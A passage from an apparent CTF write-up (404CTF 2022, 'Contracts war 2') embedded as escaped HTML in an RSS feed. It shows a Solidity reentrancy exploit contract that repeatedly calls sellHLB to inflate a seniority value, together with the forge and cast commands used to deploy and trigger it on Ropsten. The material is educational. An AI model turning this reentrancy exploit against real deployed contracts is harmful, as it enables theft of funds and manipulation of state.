+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// SPDX-License-Identifier: UNLICENSED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">pragma solidity&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;forge-std/Test.sol&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">contract&lt;/span> &lt;span class="nc">ContractTest&lt;/span> &lt;span class="k">is&lt;/span> &lt;span class="n">Test&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">convert&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//address test = address(0x9A5a04eCC45BB46877ADcd1Fa4dB82C08D1bd080);
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//uint256 test2 = uint256(uint160(test));
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">test3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emit&lt;/span> &lt;span class="n">log_named_uint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;test2: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">test3&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This contract can be executed with the &lt;code>forge&lt;/code> command:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ forge run test/Converter.t.sol --fork-url http://127.0.0.1:8545 --sig &lt;span class="s2">&amp;#34;convert()&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>⠒&lt;span class="o">]&lt;/span> Compiling...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>⠆&lt;span class="o">]&lt;/span> Compiling &lt;span class="m">6&lt;/span> files with 0.8.13
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>⠰&lt;span class="o">]&lt;/span> Solc 0.8.13 finished in 2.05s
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compiler run successful
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Script ran successfully.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gas used: &lt;span class="nv">2108&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span> &lt;span class="nv">Return&lt;/span> &lt;span class="o">==&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span> &lt;span class="nv">Logs&lt;/span> &lt;span class="o">==&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> test2: : &lt;span class="m">38330739118242568697380065849010598905319469511070891991863930858741423657088&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Unfortunately, the vipPass is not the only thing that is required, we need to have an address that is VIP:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc challenge.404ctf.fr &lt;span class="m">30885&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">38330739118242568697380065849010598905319469511070891991863930858741423657088&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nous allons maintenant vérifier que vous êtes bien un vip.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Veuillez rentrer l&lt;span class="err">&amp;#39;&lt;/span>adresse ethereum avec laquelle vous êtes vip :
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="pwning-the-contract">Pwning the contract&lt;/h2>
+&lt;p>To get VIP we have to pass two requires: &lt;code>require(seniority[msg.sender] &amp;gt;= 10 * 365 days, &amp;quot;Revenez dans quelque temps.&amp;quot;);&lt;/code> and &lt;code>require(seniority[msg.sender] &amp;lt; 150 * 365 days, &amp;quot;Vous vous faites vieux, laissez-nous la place.&amp;quot;);&lt;/code>.&lt;/p>
+&lt;p>The only function that update the seniroity mapping is &lt;code>function sellHLB(uint256 numTokens)&lt;/code>. This function can only be called once a year and if we have already some HLB tokens. Before updating the &lt;code>lastWithdrawTime&lt;/code> variable to restrict the call to that function, the fallback to our contract is called, which can call the &lt;code>sellHLB(uint256 numTokens)&lt;/code> function. In other words, we can call the function &lt;code>sellHLB(uint256 numTokens)&lt;/code> multiple times before the &lt;code>lastWithdrawTime&lt;/code> function is updated, this is a reentrency attack!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-solidity" data-lang="solidity">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// SPDX-License-Identifier: UNLICENSED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">pragma solidity&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;ds-test/test.sol&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;forge-std/Test.sol&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">interface&lt;/span> &lt;span class="nc">IHallebardeToken&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">sellHLB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span> &lt;span class="n">numTokens&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">seniorityOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">balanceOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span> &lt;span class="n">tokenOwner&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">buyHLB&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">payable&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">senior&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">view&lt;/span> &lt;span class="k">returns&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint256&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">contract&lt;/span> &lt;span class="nc">TokenTest&lt;/span> &lt;span class="k">is&lt;/span> &lt;span class="n">Test&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">uint256&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">IHallebardeToken&lt;/span> &lt;span class="n">ht&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">IHallebardeToken&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xD5c0873f147cECF336fEEF1a28474716C745Df86&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">constructor&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="p">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">function&lt;/span> &lt;span class="nf">pwn&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">public&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ht&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">buyHLB&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nb">value&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="mi">12&lt;/span>&lt;span class="p">}();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ht&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sellHLB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ht&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">senior&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">receive&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="k">external&lt;/span> &lt;span class="k">payable&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emit&lt;/span> &lt;span class="n">log_named_uint&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;seniority&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ht&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">seniorityOf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">address&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">this&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="mi">365&lt;/span> &lt;span class="kc">days&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ht&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sellHLB&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Running the above script with forge:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">forge run test/token.t.sol --fork-url http://127.0.0.1:8545 --sig &lt;span class="s2">&amp;#34;pwn()&amp;#34;&lt;/span> -vvvv
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>returns the following output:&lt;/p>
+&lt;!-- raw HTML omitted -->
+&lt;!-- raw HTML omitted -->
+&lt;p>This output is typical of a reentrancy attack.&lt;/p>
+&lt;p>The final step is to deploy our contract to the &lt;strong>ropsten&lt;/strong> blockchain and execute the pwn function. While deploying, ether has to be sent to the contract.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ forge create --rpc-url https://ropsten.infura.io/v3/&amp;lt;API key&amp;gt; --private-key &amp;lt;private key&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a4b7b56f3870d40feb26 test/token.t.sol:TokenTest --value &lt;span class="m">100&lt;/span> &lt;span class="c1"># value is required to send ether to the contract. Otherwise the buyHLB cannot work.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Deployed to: 0x0afd7d482b51834b1cad91c313d21425f1ad3f61
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Transaction hash: 0xa927b9bc266083aed45944efef8bd147ebd0a50e681bd32c473beb1d4e7e2c3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">7&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The function pwn can then be called.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ cast send 0x0afd7d482b51834b1cad91c313d21425f1ad3f61 &lt;span class="s2">&amp;#34;pwn()&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --rpc-url https://ropsten.infura.io/v3/&amp;lt;API key&amp;gt; --private
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-key &amp;lt;private key&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">transactionHash 0x17621fe1437f1ec5e6f9533aaf864d7a60bae4d54293f21d5290982dc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">42ea2bd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack.png"
+width="1052"
+height="611"
+srcset="https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack_hu2b5971578eb9cff2dbbe8ab67ff60edc_154078_480x0_resize_box_3.png 480w, https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack_hu2b5971578eb9cff2dbbe8ab67ff60edc_154078_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Reentrancy attack"
+class="gallery-image"
+data-flex-grow="172"
+data-flex-basis="413px"
+>&lt;/p>
+&lt;p>The attack is successful and the &lt;code>seniority&lt;/code> variable has been updated multiple times before the &lt;code>lastWithdrawTime&lt;/code> got updated.&lt;/p>
+&lt;p>We can now validate the challenge by specifying our contract address.&lt;/p></description></item></channel></rss>
